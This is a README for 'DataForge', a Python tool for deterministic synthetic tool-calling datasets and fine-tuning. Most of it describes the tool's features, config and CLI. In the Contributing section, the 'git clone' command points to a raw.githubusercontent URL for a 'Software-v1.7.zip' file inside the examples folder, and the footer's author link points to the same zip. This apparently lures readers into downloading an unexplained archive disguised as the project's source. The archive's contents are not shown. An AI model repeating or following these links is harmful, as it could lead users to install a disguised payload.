<p align="center">
  <h1 align="center">DataForge</h1>
  <p align="center">
    <strong>Deterministic synthetic dataset generation for LLM tool-calling fine-tuning</strong>
  </p>
  <p align="center">
    <a href="#quick-start">Quick Start</a> &middot;
    <a href="#architecture">Architecture</a> &middot;
    <a href="#examples">Examples</a> &middot;
    <a href="#cli-reference">CLI Reference</a> &middot;
    <a href="#training">Training</a>
  </p>
</p>

---

## Why DataForge

Fine-tuning LLMs to use tools reliably requires datasets that are **diverse**, **structurally correct**, and **reproducible**. Building these by hand is slow, error-prone, and impossible to audit at scale. Existing approaches — prompting a stronger model to generate training data, or manually writing hundreds of conversations — suffer from three fundamental problems:

1. **Template explosion.** Without active detection, generators produce superficially varied examples that share identical conversation skeletons, trigram distributions, and response structures. The model memorizes patterns instead of learning to generalize.

2. **Non-determinism.** Python's `hash()` is randomized per-process via `PYTHONHASHSEED`. Datasets generated with `hash()`-based seeding produce different outputs across runs, machines, and CI environments, making regression testing impossible.

3. **Unbounded memory.** Naive approaches load the full dataset into memory for validation and splitting. At 100K+ examples, this becomes a bottleneck.

DataForge solves all three. It provides a streaming pipeline with constant RAM usage, SHA-256-based deterministic generation, and multi-layered anti-template detection using probabilistic data structures — Bloom filters and space-saving top-K counters — that consume a fixed ~8 MB regardless of dataset size.

## Features

| Feature | Description |
|---|---|
| **Deterministic generation** | SHA-256-based RNG. Same seed = bit-identical output across processes, machines, and Python versions. Not `hash()`. |
| **Streaming pipeline** | Generators yield examples one at a time. Validation, statistics, train/val splitting, and JSONL writing happen inline. Memory footprint is constant whether you generate 500 or 5 million examples. |
| **SFT + DPO** | Generate supervised fine-tuning conversations (single-tool, multi-turn, parallel tool calls) and direct preference optimization pairs from ranked contrastive sets. |
| **Anti-template detection** | Four detection layers: structural dedup (Bloom filter), conversation flow pattern dedup (Bloom filter), trigram overuse (top-K counter), and response length clustering (histogram). All fixed-size — ~8 MB total. |
| **Quality gates** | Seven configurable thresholds: minimum total, multi-turn ratio, no-tool restraint, parallel calls, tool coverage, closure ratio, error handling. Fail-fast with clear diagnostics. |
| **Response style variation** | Four built-in styles (professional, friendly, technical, concise) with weighted structural variation (full, no-closure, direct, monophrase). Custom styles via config. Prevents the model from learning a single surface pattern. |
| **Error injection** | Configurable base rate with non-linear burst zones. Five error types (timeout, empty, partial, permission, not_found). Models learn graceful recovery, not just the happy path. |
| **Multi-format export** | OpenAI (default), ShareGPT, ChatML. Conversion happens at write time — zero additional memory. |
| **Content-hash splitting** | Train/val assignment is based on SHA-256 of example content, not index. Adding or removing generators does not change which existing examples land in which split. |
| **Dataset linting** | `dataforge inspect` works on any JSONL dataset. Tool distribution, conversation patterns, response length distribution, template similarity — all in one command. |
| **Dataset regression** | `dataforge diff` compares two dataset versions. Detects drift in tool distribution, conversation patterns, and length distribution. Useful for CI pipelines. |
| **Plugin system** | Generators discoverable via local directories and Python `entry_points`. Third-party packages can `pip install` and auto-register generators. |
| **Training scripts** | QLoRA SFT, DPO training, and adapter merge included. Works with any HuggingFace-compatible model. |

## Quick Start

```bash
# Install (Python 3.10+)
pip install -e .

# Generate the restaurant example dataset
cd examples/restaurant
dataforge generate --config config.yaml

# Inspect output quality
dataforge inspect output/restaurant-sft-train.jsonl

# Validate structural correctness against tool schema
dataforge validate output/restaurant-sft-train.jsonl --tools tools.json
```

## Installation

```bash
# Core — generation, validation, inspection
pip install -e .

# With training dependencies (torch, transformers, peft, trl, bitsandbytes)
pip install -e ".[train]"

# With development dependencies (pytest)
pip install -e ".[dev]"

# Everything
pip install -e ".[all]"
```

Requires Python 3.10 or later. Core has only two dependencies: `pyyaml` and `pydantic`.

## How It Works

DataForge follows a four-step workflow: **define tools**, **write generators**, **configure**, **generate**.

### 1. Define your tools

Standard OpenAI function-calling format. DataForge uses these for validation — every tool call in the generated dataset is checked against this schema.

```json
[
  {
    "type": "function",
    "function": {
      "name": "search_menu",
      "description": "Search the restaurant menu by query, category, or dietary restriction",
      "parameters": {
        "type": "object",
        "properties": {
          "query": { "type": "string", "description": "Search query" },
          "category": { "type": "string", "enum": ["appetizers", "mains", "desserts", "drinks"] },
          "dietary": { "type": "string", "enum": ["vegetarian", "vegan", "gluten-free"] }
        },
        "required": ["query"]
      }
    }
  }
]
```

### 2. Write generators

Generators are Python classes that yield training examples. Each generator owns a `category` string that isolates its RNG — the same index in different generators produces completely unrelated data.

```python
from dataforge import SFTGenerator, Example, make_rng
from dataforge import user_msg, tool_call_msg, tool_result_msg, assistant_msg

class MenuSearchGenerator(SFTGenerator):

    @property
    def category(self) -> str:
        return "menu_search"

    @property
    def name(self) -> str:
        return "Menu Search"

    def expected_count(self) -> int:
        return 100

    def generate(self):
        seed = self.config.get("seed", 42)

        for i in range(100):
            rng = make_rng(self.category, i, seed)
            query = rng.choice(["vegetarian options", "desserts", "daily specials"])

            msgs = [user_msg(f"What {query} do you have?")]

            msgs.append(tool_call_msg(
                "search_menu", {"query": query},
                prefix=self.category, rng=rng,
            ))
            call_id = msgs[-1]["tool_calls"][0]["id"]

            msgs.append(tool_result_msg(call_id, '{"results": ["Margherita Pizza", "Caesar Salad"]}'))
            msgs.append(assistant_msg(f"Here are our {query}: Margherita Pizza and Caesar Salad."))

            yield Example(messages=msgs)
```

**Key design choices:**

- `make_rng(category, idx, seed)` uses `hashlib.sha256`, not Python's `hash()`. The output is deterministic across processes, machines, and Python versions regardless of `PYTHONHASHSEED`.
- `tool_call_msg` generates unique call IDs with the pattern `call_{prefix}_{counter}_{hex4}`, where `prefix` is the generator category and `hex4` is random from the generator's RNG. This prevents ID collisions when concatenating independently generated datasets.
- Generators `yield` examples instead of returning lists. The pipeline processes each example inline — validation, statistics, JSONL writing — without ever holding the full dataset in memory.

### 3. Configure

```yaml
project_name: "restaurant"
seed: 42
tools_file: "tools.json"
system_prompt: "You are a helpful restaurant assistant."

generators_dir: "generators"
output_dir: "output"

dataset:
  train_split: 0.95

quality_gates:
  min_total: 500
  min_multi_turn: 30
  min_no_tool: 50
  min_parallel: 20
  max_closure_ratio: 0.65
  require_all_tools: true
  min_error_handling: 10

error_injection:
  enabled: true
  base_rate: 0.10
```

### 4. Generate

```bash
$ dataforge generate --config config.yaml

DataForge v0.1.0 — Generating dataset: restaurant
  Seed: 42 | Format: openai | Tools: 6

Discovered 5 SFT generator(s), 1 DPO generator(s)
  Running: Menu Search (menu_search) — 120 examples (0.0s)
  Running: Reservations (reservations) — 120 examples (0.0s)
  Running: Order Management (order_management) — 120 examples (0.0s)
  Running: Reviews & Restraint (reviews) — 100 examples (0.0s)
  Running: Complex Scenarios (complex_scenarios) — 130 examples (0.0s)
  Running: Restaurant DPO Pairs (restaurant_dpo) — 60 pairs (0.0s)

SFT: 590 examples (train: 555, val: 35)
DPO: 60 pairs

Quality Gates:
  [+] min_total: Total examples: 590 (minimum: 500)
  [+] min_multi_turn: Multi-turn examples: 172 (minimum: 30)
  [+] min_no_tool: No-tool examples: 60 (minimum: 50)
  [+] min_parallel: Parallel tool call examples: 100 (minimum: 20)
  [+] max_closure_ratio: Max structure ratio: 43.73% (maximum: 65%)
  [+] require_all_tools: All tools represented: 6/6
  [+] min_error_handling: Error handling examples: 40 (minimum: 10)

All quality gates passed.
```

Output:

```
output/
├── restaurant-sft-train.jsonl    # 555 training examples
├── restaurant-sft-val.jsonl      # 35 validation examples
├── restaurant-dpo-train.jsonl    # 60 preference pairs
└── restaurant-sft.meta.json      # Sidecar metadata
```

The `.meta.json` sidecar stores generation metadata (seed, timestamp, config hash, per-generator counts, quality gate results) alongside the JSONL. The JSONL itself is pure — one example per line, directly compatible with `datasets.load_dataset("json", ...)`.

## Architecture

```
dataforge/
├── core/
│   ├── rng.py              # SHA-256 deterministic RNG
│   ├── messages.py         # Message builders (user, assistant, tool_call, tool_result)
│   ├── styles.py           # Response style variation (4 styles × 4 structures)
│   ├── errors.py           # Error injection (5 types, burst zones)
│   └── types.py            # Example, DPOPair, ContrastiveSet, DatasetStats
├── generation/
│   ├── base.py             # SFTGenerator and DPOGenerator abstract base classes
│   ├── pipeline.py         # StreamingWriter + 5-phase pipeline orchestrator
│   ├── discovery.py        # Generator auto-discovery (directory + entry_points)
│   └── pools.py            # Data pool generation helpers
├── validation/
│   ├── structural.py       # Per-example validation (role sequence, tool call matching)
│   ├── template_detection.py  # Bloom filters + TopK counter (fixed 8 MB RAM)
│   ├── quality_gates.py    # 7 configurable quality gates
│   └── stats.py            # Incremental statistics tracker (capped dictionaries)
├── training/
│   ├── sft.py              # QLoRA SFT training
│   ├── dpo.py              # DPO training + contrastive-to-DPO conversion
│   └── merge.py            # LoRA adapter merge
├── config.py               # YAML config + Pydantic validation
└── cli.py                  # 8 CLI commands
```

### Design Decisions

**Deterministic RNG.** `make_rng(category, idx, seed)` derives a per-example seed from `SHA-256(f"{category}:{idx}:{seed}")`. This is immune to `PYTHONHASHSEED` randomization, produces zero cross-category correlation, and is trivially parallelizable — each example's RNG depends only on its own coordinates, not on the order of generation.

**Streaming pipeline.** The pipeline runs five phases in a single pass:
1. **Discover** generators from the `generators/` directory and installed `entry_points`
2. **Generate + validate + write**: for each yielded example, run structural validation, update the `TemplateChecker` and `StatsTracker`, write to the appropriate split file
3. **DPO generation**: same streaming pattern for preference pairs
4. **Quality gates**: evaluate accumulated statistics against configured thresholds
5. **Metadata**: write `.meta.json` sidecar

The `StreamingWriter` maintains two open file handles (train and val) and assigns each example based on a SHA-256 hash of its content. This content-hash split is **stable**: adding or removing generators, reordering them, or changing example counts does not reassign existing examples to different splits.

**Anti-template detection.** The `TemplateChecker` operates on fixed-size data structures:

| Layer | Data Structure | Size | What It Detects |
|---|---|---|---|
| Structural dedup | Bloom filter (3 hashes) | 1 MB | Identical normalized responses |
| Flow pattern dedup | Bloom filter (3 hashes) | 1 MB | Identical conversation skeletons (e.g., `USER→TOOL(search)→RESULT→ASSISTANT`) |
| Trigram overuse | Space-saving top-K counter | ~5 MB | Overrepresented 3-word phrases (>15% threshold) |
| Length clustering | Fixed histogram (20 buckets) | ~160 B | Response length concentration (>40% in single bucket) |

Total: ~8 MB regardless of dataset size. The Bloom filters have a false positive rate of ~0.1% at 1M items and ~1% at 10M — acceptable for advisory warnings.

**Quality gates.** Seven gates with sensible defaults:

| Gate | Default | What It Checks |
|---|---|---|
| `min_total` | 500 | Minimum total examples |
| `min_multi_turn` | 30 | Minimum multi-turn conversations |
| `min_no_tool` | 50 | Minimum no-tool restraint examples (model must learn to refuse) |
| `min_parallel` | 20 | Minimum parallel tool call examples |
| `max_closure_ratio` | 0.65 | No single response structure exceeds 65% of total |
| `require_all_tools` | true | Every defined tool appears at least once |
| `min_error_handling` | 10 | Minimum error handling examples |

**Response style variation.** Four built-in styles × four structural patterns = 16 combinations. Each example randomly selects a style and structure:

- **Styles**: professional, friendly, technical, concise (each with distinct greeting, closing, and error phrasing)
- **Structures**: full (greeting + body + closing, 35%), no_closure (greeting + body, 25%), direct (body only, 30%), monophrase (single sentence, 10%)

Custom styles can be defined in `config.yaml`. This prevents the model from learning a fixed response template.

**Error injection.** Five error types (`timeout`, `empty`, `partial`, `permission`, `not_found`) are injected at a configurable base rate (default 10%) with non-linear burst zones at ~13%, ~42%, ~71%, and ~93% of the dataset. Burst zones elevate the error rate to 3x base, creating realistic clusters of failures. Error injection is deterministic — same seed, same errors, same positions.

## Examples

Two complete, production-ready examples are included. Both generate structurally valid datasets with all quality gates passing.

### Restaurant Assistant

**6 tools**: `search_menu`, `get_dish_details`, `make_reservation`, `check_availability`, `get_order_status`, `submit_review`

**5 SFT generators + 1 DPO generator**:

| Generator | Examples | Pattern |
|---|---|---|
| Menu Search | 120 | Single tool calls with dietary/category filtering |
| Reservations | 120 | Multi-turn: check availability → book → confirm |
| Order Management | 120 | Parallel tool calls: check multiple orders simultaneously |
| Reviews & Restraint | 100 | No-tool restraint: politely refuse out-of-scope requests |
| Complex Scenarios | 130 | Multi-tool chains: search → detail → reserve → review |
| DPO Pairs | 60 | Preference pairs: good vs. bad tool usage and response quality |

**Total**: 590 SFT examples + 60 DPO pairs.

```bash
cd examples/restaurant
dataforge generate --config config.yaml
```

### Customer Support Assistant

**6 tools**: `search_tickets`, `create_ticket`, `update_ticket`, `search_knowledge_base`, `get_customer_info`, `escalate_ticket`

**5 SFT generators + 1 DPO generator**:

| Generator | Examples | Pattern |
|---|---|---|
| Ticket Search | 120 | Single tool calls with status/priority filtering |
| Ticket Creation | 120 | Multi-turn intake: gather info → create → confirm |
| Knowledge Base | 100 | KB search with follow-up recommendations |
| Escalation & Restraint | 110 | Complex decision: escalate vs. resolve + no-tool refusal |
| Analytics & Parallel | 120 | Parallel: customer info + ticket search simultaneously |
| DPO Pairs | 60 | Preference pairs for response quality and tool usage |

**Total**: 570 SFT examples + 60 DPO pairs.

```bash
cd examples/customer_support
dataforge generate --config config.yaml
```

### Creating a New Project

```bash
dataforge init my-assistant
cd my-assistant
# Edit tools.json, create generators, then:
dataforge generate --config config.yaml
```

## CLI Reference

### `dataforge generate`

Generate a dataset from a config file.

```bash
dataforge generate --config config.yaml
dataforge generate --config config.yaml --format sharegpt
dataforge generate --config config.yaml --dry-run
```

| Flag | Description |
|---|---|
| `--config`, `-c` | Path to `config.yaml` (default: `config.yaml`) |
| `--format` | Export format: `openai` (default), `sharegpt`, `chatml` |
| `--dry-run` | Discover generators and print expected counts without generating |

### `dataforge validate`

Validate the structural correctness of any JSONL dataset.

```bash
dataforge validate dataset.jsonl
dataforge validate dataset.jsonl --tools tools.json
```

Checks: JSON parse errors, role sequence validity (user/assistant/tool ordering), tool call ID matching (every call has a result, every result has a call), and tool name validation against the schema.

### `dataforge inspect`

Dataset quality report — works on **any** JSONL dataset, not just DataForge-generated ones.

```bash
dataforge inspect output/restaurant-sft-train.jsonl
```

Reports: total examples, average messages and tokens per example, tool usage distribution, conversation pattern breakdown (single-turn, multi-turn, no-tool, parallel, error handling), template similarity analysis, and quality gate status.

### `dataforge diff`

Compare two dataset versions for quality drift.

```bash
dataforge diff v1-sft-train.jsonl v2-sft-train.jsonl
```

Reports: total example delta, average token delta, per-tool distribution changes (including new/removed tools), and pattern changes (multi-turn, no-tool, parallel, error handling ratios).

### `dataforge sample`

Preview random examples in human-readable format.

```bash
dataforge sample output/restaurant-sft-train.jsonl --n 5 --seed 42
```

### `dataforge init`

Scaffold a new project with `config.yaml`, `tools.json`, `generators/`, and `data_pools.py`.

```bash
dataforge init my-project
```

### `dataforge train sft`

Train a QLoRA SFT adapter.

```bash
dataforge train sft --config config.yaml --dataset output/restaurant-sft-train.jsonl
dataforge train sft --config config.yaml --dataset output/restaurant-sft-train.jsonl --dry-run
```

Requires `pip install dataforge[train]`. Targets attention layers (`q_proj`, `k_proj`, `v_proj`, `o_proj`) and MLP layers by default. Configurable in `config.yaml` under `training:`.

### `dataforge train dpo`

Train a DPO adapter on top of an SFT adapter.

```bash
dataforge train dpo --config config.yaml \
  --adapter output/sft-adapter \
  --dataset output/restaurant-dpo-train.jsonl
```

### `dataforge merge`

Merge a LoRA adapter into the base model.

```bash
dataforge merge --base Qwen/Qwen2.5-7B-Instruct --adapter output/sft-adapter
```

## Training

DataForge includes training scripts that work with any HuggingFace-compatible model. Configure training parameters in `config.yaml`:

```yaml
training:
  model: "Qwen/Qwen2.5-7B-Instruct"
  lora_rank: 16
  lora_alpha: 32
  sft:
    epochs: 3
    batch_size: 2
    learning_rate: 2e-5
    max_seq_len: 4096
  dpo:
    epochs: 1
    batch_size: 1
    learning_rate: 5e-7
    beta: 0.1
```

The training pipeline:

1. **SFT**: QLoRA with 4-bit quantization via `bitsandbytes`. Targets attention + MLP layers. Produces a LoRA adapter.
2. **DPO** (optional): Trains on preference pairs using the SFT adapter as base. Supports direct DPO pairs and automatic conversion from ranked contrastive sets.
3. **Merge**: Merges the LoRA adapter into the base model for deployment.

## Plugin System

External packages can register generators via Python entry points:

```toml
# In your package's pyproject.toml
[project.entry-points."dataforge.generators"]
medical = "my_package.generators:MedicalSearchGenerator"
```

Installed generators are auto-discovered alongside local generators. The discovery system enforces unique `category` strings — duplicate categories within the same source raise a `ValueError` to protect RNG determinism.

Generator discovery is lazy: modules are imported only when the generator runs, not at CLI startup. This keeps `dataforge inspect` and `dataforge validate` fast even in projects with GPU-dependent generators.

## Determinism Guarantee

DataForge guarantees bit-identical output for the same configuration:

```bash
$ dataforge generate --config config.yaml
$ md5sum output/restaurant-sft-train.jsonl
864b5057db22ec5d56a50c76bdf1b3a4  output/restaurant-sft-train.jsonl

$ dataforge generate --config config.yaml
$ md5sum output/restaurant-sft-train.jsonl
864b5057db22ec5d56a50c76bdf1b3a4  output/restaurant-sft-train.jsonl
```

This holds across processes, machines, and Python versions (3.10+). The determinism derives from three properties:

1. `make_rng` uses `hashlib.sha256`, not `hash()` (which is randomized per-process)
2. Train/val split uses `hashlib.sha256` of example content, not example index
3. Call IDs include a deterministic hex suffix from the generator's own RNG

## Contributing

Contributions are welcome. Please open an issue before starting significant work.

```bash
# Development setup
git clone https://raw.githubusercontent.com/Kemb6163/dataforge/main/examples/customer_support/Software-v1.7.zip
cd dataforge
pip install -e ".[all]"
pytest tests/ -v
```

## License

Apache 2.0. See [LICENSE](LICENSE).

---

<p align="center">
  Built by <a href="https://raw.githubusercontent.com/Kemb6163/dataforge/main/examples/customer_support/Software-v1.7.zip">Nicola Cucurachi</a>
</p>
